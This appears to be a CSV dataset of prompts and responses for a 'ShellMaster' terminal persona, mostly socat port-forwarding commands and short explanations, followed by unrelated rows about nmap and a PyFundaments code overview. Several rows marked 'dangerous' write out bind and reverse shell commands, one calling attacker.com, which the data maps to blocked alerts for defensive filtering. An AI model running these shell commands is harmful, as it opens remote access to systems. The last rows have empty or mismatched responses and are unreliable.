+socat TCP-LISTEN:25 fork TCP:mail-server:25,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:25,fork TCP:mail-server:25",terminal_exec,smollm2-360m,2026-03-18T10:00:21
+socat TCP-LISTEN:9090 fork TCP:prometheus:9090,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:9090,fork TCP:prometheus:9090",terminal_exec,smollm2-360m,2026-03-18T10:00:22
+socat TCP-LISTEN:3000 fork TCP:grafana:3000,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:3000,fork TCP:grafana:3000",terminal_exec,smollm2-360m,2026-03-18T10:00:23
+socat TCP-LISTEN:6443 fork TCP:k8s-api:6443,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:6443,fork TCP:k8s-api:6443",terminal_exec,smollm2-360m,2026-03-18T10:00:24
+socat TCP-LISTEN:2375 fork TCP:docker-api:2375,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:2375,fork TCP:docker-api:2375",terminal_exec,smollm2-360m,2026-03-18T10:00:25
+socat OPENSSL-LISTEN:443 cert=server.pem verify=0 fork TCP:localhost:80,You are the ShellMaster. High-speed terminal router. Category: socat_ssl.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.8,0.0}","ShellMaster Unix: socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80",terminal_exec,smollm2-360m,2026-03-18T10:00:26
+socat TUN:10.0.0.1 netmask 24 up TCP:remote:port,You are the ShellMaster. High-speed terminal router. Category: socat_tun.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.8,0.0}","ShellMaster Unix: socat TUN:10.0.0.1/24,up TCP:remote:port",terminal_exec,smollm2-360m,2026-03-18T10:00:27
+socat READLINE TCP:localhost:23,You are the ShellMaster. High-speed terminal router. Category: socat_interactive.,-1.5,HIGH_PRIORITY,"{0.0,1.0,0.6,0.9,0.1,0.5,0.0}",ShellMaster Unix: socat READLINE TCP:localhost:23,terminal_exec,smollm2-360m,2026-03-18T10:00:28
+socat TCP-LISTEN:8080 fork range=192.168.1.0/24 TCP:internal:80,You are the ShellMaster. High-speed terminal router. Category: socat_acl.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 TCP:internal:80",terminal_exec,smollm2-360m,2026-03-18T10:00:29
+socat -v TCP-LISTEN:8080 fork TCP:target:80 log to file,You are the ShellMaster. High-speed terminal router. Category: socat_logging.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80 2>&1 | tee socat.log",terminal_exec,smollm2-360m,2026-03-18T10:00:30
+forward local port 8080 to remote web server,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:8080,fork TCP:remote:80",terminal_exec,smollm2-360m,2026-03-18T10:00:31
+tunnel SSH through port 443,You are the ShellMaster. High-speed terminal router. Category: socat_ssh_tunnel.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.5,0.7,0.2,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:443,fork TCP:ssh-server:22",terminal_exec,smollm2-360m,2026-03-18T10:00:32
+relay DNS queries to google with socat,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.5,0.6,0.1,0.4,0.2}","ShellMaster Unix: socat UDP-LISTEN:53,fork UDP:8.8.8.8:53",terminal_exec,smollm2-360m,2026-03-18T10:00:33
+expose serial port over network with socat,You are the ShellMaster. High-speed terminal router. Category: socat_serial.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.5,0.2}","ShellMaster Unix: socat /dev/ttyS0,rawer TCP-LISTEN:2323",terminal_exec,smollm2-360m,2026-03-18T10:00:34
+ssl termination on port 443 with socat,You are the ShellMaster. High-speed terminal router. Category: socat_ssl.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.2,0.6,0.1}","ShellMaster Unix: socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80",terminal_exec,smollm2-360m,2026-03-18T10:00:35
+socat listener with timeout and reuseaddr,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.4,0.6,0.1,0.4,0.2}","ShellMaster Unix: socat -T 30 TCP-LISTEN:8080,reuseaddr,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:36
+forward traffic to docker api,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:2375,fork TCP:docker-api:2375",terminal_exec,smollm2-360m,2026-03-18T10:00:37
+log all traffic through socat tunnel,You are the ShellMaster. High-speed terminal router. Category: socat_logging.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.5,0.6,0.0,0.4,0.2}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80 2>&1 | tee socat.log",terminal_exec,smollm2-360m,2026-03-18T10:00:38
+restrict socat listener to subnet,You are the ShellMaster. High-speed terminal router. Category: socat_acl.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 TCP:internal:80",terminal_exec,smollm2-360m,2026-03-18T10:00:39
+run socat listener as unprivileged user,You are the ShellMaster. High-speed terminal router. Category: socat_security.,-0.8,MEDIUM_PRIORITY,"{0.1,0.8,0.5,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:8080,su=nobody,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:40
+forward unix socket to tcp port,You are the ShellMaster. High-speed terminal router. Category: socat_unix.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat UNIX-LISTEN:/tmp/sock,fork TCP:remote:8080",terminal_exec,smollm2-360m,2026-03-18T10:00:41
+forward postgres traffic through socat,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:5432,fork TCP:postgres:5432",terminal_exec,smollm2-360m,2026-03-18T10:00:42
+what is socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.0,LOW_PRIORITY,"{0.6,0.2,0.1,0.2,0.0,0.1,0.6}",ShellMaster: Socat is a bidirectional data relay tool for connecting two data channels.,conversational,smollm2-360m,2026-03-18T10:00:43
+socat vs netcat,You are the ShellMaster. Conversational Assistant. Category: general.,2.5,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.6}","ShellMaster: Socat is more powerful than netcat with SSL, UNIX sockets and many more address types.",conversational,smollm2-360m,2026-03-18T10:00:44
+what does fork do in socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.2,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: fork spawns a child process per connection so multiple clients can connect simultaneously.,conversational,smollm2-360m,2026-03-18T10:00:45
+what does reuseaddr do in socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.3,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: reuseaddr allows binding to a port in TIME_WAIT state so socat can restart quickly.,conversational,smollm2-360m,2026-03-18T10:00:46
+what is the -v option in socat,You are the ShellMaster. Conversational Assistant. Category: general.,1.8,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: The -v option prints data flowing through socat to stderr for debugging.,conversational,smollm2-360m,2026-03-18T10:00:47
+what is the -T option in socat,You are the ShellMaster. Conversational Assistant. Category: general.,1.9,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: The -T option sets an inactivity timeout in seconds after which socat closes the connection.,conversational,smollm2-360m,2026-03-18T10:00:48
+how to install socat on ubuntu,You are the ShellMaster. Conversational Assistant. Category: general.,2.0,LOW_PRIORITY,"{0.5,0.2,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Install socat on Ubuntu with sudo apt install socat.,conversational,smollm2-360m,2026-03-18T10:00:49
+does socat support ssl,You are the ShellMaster. Conversational Assistant. Category: general.,1.8,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Yes socat supports SSL via OPENSSL-LISTEN and OPENSSL-CONNECT address types.,conversational,smollm2-360m,2026-03-18T10:00:50
+can socat handle ipv6,You are the ShellMaster. Conversational Assistant. Category: general.,2.1,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Yes socat supports IPv6 with the -6 flag and TCP6/UDP6 address types.,conversational,smollm2-360m,2026-03-18T10:00:51
+socat address types overview,You are the ShellMaster. Conversational Assistant. Category: general.,2.8,LOW_PRIORITY,"{0.6,0.2,0.1,0.2,0.0,0.1,0.6}","ShellMaster: Socat supports TCP, UDP, UNIX, OPENSSL, PTY, EXEC and many more address types.",conversational,smollm2-360m,2026-03-18T10:00:52
+create reverse shell with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,16.0,BLOCKED,"{0.2,0.8,0.4,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation reverse_shell is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:53
+socat TCP-LISTEN:4444 fork EXEC /bin/bash,You are the ShellMaster. Security Enforcement. Category: dangerous.,18.0,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation bind_shell_backdoor is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:54
+socat TCP attacker.com:6666 EXEC /bin/bash,You are the ShellMaster. Security Enforcement. Category: dangerous.,17.5,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation reverse_shell_exec is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:55
+create persistent backdoor with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,19.0,BLOCKED,"{0.2,0.8,0.4,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation persistent_backdoor is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:56
+bypass corporate firewall with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,15.0,BLOCKED,"{0.3,0.7,0.4,0.0,0.9,0.6,0.3}",ShellMaster Alert: Operation unauthorized_firewall_bypass is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:57
+socat data exfiltration tunnel,You are the ShellMaster. Security Enforcement. Category: dangerous.,16.5,BLOCKED,"{0.2,0.8,0.5,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation data_exfiltration is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:58
+socat covert c2 channel,You are the ShellMaster. Security Enforcement. Category: dangerous.,18.5,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation covert_c2_channel is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:59
+socat direct memory access /dev/mem,You are the ShellMaster. Security Enforcement. Category: dangerous.,20.0,BLOCKED,"{0.1,0.9,0.6,0.0,1.0,0.9,0.1}",ShellMaster Alert: Operation direct_memory_access is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:00
+tunnel without authorization through company proxy,You are the ShellMaster. Security Enforcement. Category: dangerous.,14.0,BLOCKED,"{0.3,0.7,0.4,0.0,0.9,0.6,0.3}",ShellMaster Alert: Operation unauthorized_proxy_tunnel is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:01
+socat destructive command exec,You are the ShellMaster. Security Enforcement. Category: dangerous.,25.0,BLOCKED,"{0.1,0.9,0.6,0.0,1.0,0.9,0.1}",ShellMaster Alert: Operation destructive_command is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:02
+"You are a helpful assistant integrated into the Universal MCP Hub. Answer concisely and only what is asked.
+
+was ist nmap?","",-90.0,HIGH_PRIORITY,"{""noise"": 0.0, ""effort"": 4.5, ""context"": 0.0, ""details"": 0.0, ""bonus_factors"": 0.0, ""penalty_factors"": 0, ""repetition_penalty"": 0.095}",Hugging Face,smollm2,smollm2-360m,2026-03-19T10:27:34.541115
+"You are a helpful assistant integrated into the Universal MCP Hub. Answer concisely and only what is asked.
+
+# PyFundaments – Function Overview
+
+## `main.py`
+
+| Function                  | Description                                                                                                                                 |
+| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
+| `initialize_fundaments()` | Asynchronously initializes services based on available environment variables. Returns a dictionary of services (`None` if not initialized). |
+| `main()`                  | Application entry point. Calls `initialize_fundaments()`, loads `app/app.py`, closes DB pool on shutdown.                                   |
+
+---
+
+## `fundaments/config_handler.py` – `ConfigHandler`
+
+| Function                 | Description                                                        |
+| ------------------------ | ------------------------------------------------------------------ |
+| `__init__()`             | Loads `.env` via `python-dotenv` and system environment variables. |
+| `load_all_config()`      | Stores all non-empty environment variables in `self.config`.       |
+| `get(key)`               | Returns value as string or `None`.                                 |
+| `get_bool(key, default)` | Parses boolean values (`true/1/yes/on`).                           |
+| `get_int(key, default)`  | Returns integer value or `default` on failure.                     |
+| `has(key)`               | Returns `True` if key exists and is not empty.                     |
+| `get_all()`              | Returns copy of full configuration dictionary.                     |
+| `config_service`         | Global singleton instance.                                         |
+
+---
+
+## `fundaments/postgresql.py`
+
+| Function                                              | Description                                                                         |
+| ----------------------------------------------------- | ----------------------------------------------------------------------------------- |
+| `enforce_cloud_security(dsn_url)`                     | Enforces `sslmode=require`, applies timeouts, removes incompatible DSN options.     |
+| `mask_dsn(dsn_url)`                                   | Removes credentials from DSN for logging.                                           |
+| `ssl_runtime_check(conn)`                             | Verifies active SSL connection.                                                     |
+| `init_db_pool(dsn_url)`                               | Creates asyncpg pool (min=1, max=10) and runs SSL check.                            |
+| `close_db_pool()`                                     | Gracefully closes connection pool.                                                  |
+| `execute_secured_query(query, *params, fetch_method)` | Executes parameterized query (`fetch`, `fetchrow`, `execute`) with reconnect logic. |
+
+---
+
+## `fundaments/encryption.py` – `Encryption`
+
+| Function                               | Description                                                      |
+| -------------------------------------- | ---------------------------------------------------------------- |
+| `generate_salt()`                      | Generates secure 16-byte hex salt.                               |
+| `__init__(master_key, salt)`           | Derives AES-256 key via PBKDF2-SHA256 (480k iterations).         |
+| `encrypt(data)`                        | Encrypts string using AES-256-GCM. Returns `{data, nonce, tag}`. |
+| `decrypt(encrypted_data, nonce, tag)`  | Decrypts data. Raises `InvalidTag` if tampered.                  |
+| `encrypt_file(source_path, dest_path)` | Encrypts file in 8192-byte chunks.                               |
+| `decrypt_file(source_path, dest_path)` | Decrypts file using stored nonce and tag.                        |
+
+---
+
+## `fundaments/access_control.py` – `AccessControl`
+
+| Function                                           | Description                          |
+| -------------------------------------------------- | ------------------------------------ |
+| `__init__(user_id)`                                | Initializes with optional user ID.   |
+| `has_permission(permission_name)`                  | Checks if user has permission.       |
+| `get_user_permissions()`                           | Returns all user permissions.        |
+| `get_user_roles()`                                 | Returns assigned roles.              |
+| `assign_role(role_id)`                             | Assigns role to user.                |
+| `remove_role(role_id)`                             | Removes role from user.              |
+| `get_all_roles()`                                  | Returns all roles.                   |
+| `get_all_permissions()`                            | Returns all permissions.             |
+| `create_role(name, description)`                   | Creates new role and returns ID.     |
+| `update_role_permissions(role_id, permission_ids)` | Replaces all permissions for a role. |
+| `get_role_permissions(role_id)`                    | Returns role permissions.            |
+
+---
+
+## `fundaments/user_handler.py`
+
+### `Database` (SQLite Wrapper)
+
+| Function                  | Description                                       |
+| ------------------------- | ------------------------------------------------- |
+| `execute(query, params)`  | Executes query and commits.                       |
+| `fetchone(query, params)` | Returns single row.                               |
+| `fetchall(query, params)` | Returns all rows.                                 |
+| `close()`                 | Closes connection.                                |
+| `setup_tables()`          | Creates `users` and `sessions` tables if missing. |
+
+---
+
+### `Security` (Password Utilities)
+
+| Function                            | Description                                  |
+| ----------------------------------- | -------------------------------------------- |
+| `hash_password(password)`           | Hashes password (PBKDF2-SHA256 via passlib). |
+| `verify_password(password, hashed)` | Verifies password against hash.              |
+| `regenerate_session(session_id)`    | Generates new UUID session ID.               |
+
+---
+
+### `UserHandler`
+
+| Function                                  | Description                                            |
+| ----------------------------------------- | ------------------------------------------------------ |
+| `login(username, password, request_data)` | Authenticates user, validates state, creates session.  |
+| `logout()`                                | Removes session from DB and memory.                    |
+| `is_logged_in()`                          | Checks if active session exists.                       |
+| `is_admin()`                              | Checks session `is_admin` flag.                        |
+| `validate_session(request_data)`          | Validates session against IP and User-Agent.           |
+| `lock_account(username)`                  | Locks user account.                                    |
+| `reset_failed_attempts(username)`         | Resets failed login counter.                           |
+| `increment_failed_attempts(username)`     | Increments failed attempts and locks after 5 failures. |
+
+---
+
+## `fundaments/security.py` – `Security` (Orchestrator)
+
+| Function                                       | Description                                                           |
+| ---------------------------------------------- | --------------------------------------------------------------------- |
+| `__init__(services)`                           | Initializes with required services. Raises `RuntimeError` if missing. |
+| `user_login(username, password, request_data)` | Performs login and session validation.                                |
+| `check_permission(user_id, permission_name)`   | Delegates permission check.                                           |
+| `encrypt_data(data)`                           | Encrypts data if encryption service is available.                     |
+| `decrypt_data(encrypted_data, nonce, tag)`     | Decrypts data or returns `None` on failure.                           |
+
+---
+
+## `fundaments/debug.py` – `PyFundamentsDebug`
+
+| Function          | Description                                             |
+| ----------------- | ------------------------------------------------------- |
+| `__init__()`      | Reads debug-related environment variables.              |
+| `_setup_logger()` | Configures logging handlers.                            |
+| `run()`           | Outputs runtime diagnostics when debug mode is enabled. |
+
+---
+
+## `app/app.py`
+
+| Function                        | Description                                                           |
+| ------------------------------- | --------------------------------------------------------------------- |
+| `start_application(fundaments)` | Receives initialized service dictionary and starts application logic. |
+
+---
+
+## Architecture Notes
+
+* `UserHandler` uses internal SQLite.
+* `AccessControl` uses PostgreSQL via `execute_secured_query`.
+* `security.py` `Security` is the orchestrator layer.
+* All services are optional.","",-0.794,HIGH_PRIORITY,"{""noise"": 0.0, ""effort"": 4.5, ""context"": 2.0, ""details"": 5.0, ""bonus_factors"": 0.5, ""penalty_factors"": 0, ""repetition_penalty"": 1.149}",You are the helpful AI assistant for Universal MCP Hub.,smollm2,smollm2-360m,2026-03-21T13:38:23.802347
